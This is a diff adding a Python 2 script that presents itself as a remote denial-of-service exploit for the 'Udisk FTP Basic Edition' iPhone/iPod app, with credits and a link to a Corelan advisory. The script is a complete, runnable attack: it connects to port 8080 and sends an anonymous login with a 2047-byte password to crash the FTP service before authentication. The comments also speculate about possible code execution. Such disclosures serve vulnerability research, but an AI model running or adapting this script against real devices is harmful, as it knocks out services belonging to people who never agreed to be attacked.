@@ -1,0 +1,55 @@
+#!/usr/bin/python
+#
+# Apple Iphone/Ipod - Udisk FTP Basic Edition Remote 0day DOS exploit
+# Found by: Steven Seeley (mr_me) seeleymagic [at] hotmail [dot] com
+# Homepage: http://6tags.com/n/
+# Price: $4.99
+# Download: From the app store (use your itunes account)
+# Tested on: Iphone 3G - firmware 3.1.2 (Darwin kernel)
+# Greetz to: Corelan Security Team::corelanc0d3r/ekse/EdiStrosar/Rick2600/MarkoT/
+# Advisory: http://www.corelan.be:8800/index.php/forum/security-advisories/corelan-10-003-u-disk-ftp-pre-auth-remote-dos/
+#
+# Note: This **could** be remotley exploitable with code execution. 
+# I have not reversed this app..
+
+print "|------------------------------------------------------------------|"
+print "|                         __               __                      |"
+print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |"
+print "|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |"
+print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |"
+print "| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |"
+print "|                                                                  |"
+print "|                                       http://www.corelan.be:8800 |"
+print "|                                              security@corelan.be |"
+print "|                                                                  |"
+print "|-------------------------------------------------[ EIP Hunters ]--|"
+
+print "[+] Apple Iphone/Ipod - Udisk FTP basic edition Remote DOS exploit"
+import socket
+import sys
+
+def Usage():
+    print ("Usage:  ./udisk.py <serv_ip>\n")
+    print ("Example:./udisk.py 192.168.2.3\n")
+if len(sys.argv) <> 2:
+        Usage()
+        sys.exit(1)
+else:
+    hostname = sys.argv[1]
+    username = "anonymous"
+    passwd = "\x41" * 2047
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        sock.connect((hostname, 8080))
+	print "[+] Connecting to the target.."
+    except:
+        print ("[-] Connection error!")
+        sys.exit(1)
+    r=sock.recv(1024)
+    print "[+] Sending payload.. ph33r"
+    sock.send("USER %s\r\n" %username)
+    sock.send("PASS %s\r\n" %passwd)
+    sock.send("PWD\r\n")
+    sock.close()
+    print "[+] Server is now DOS'ed!"
+    sys.exit(0);
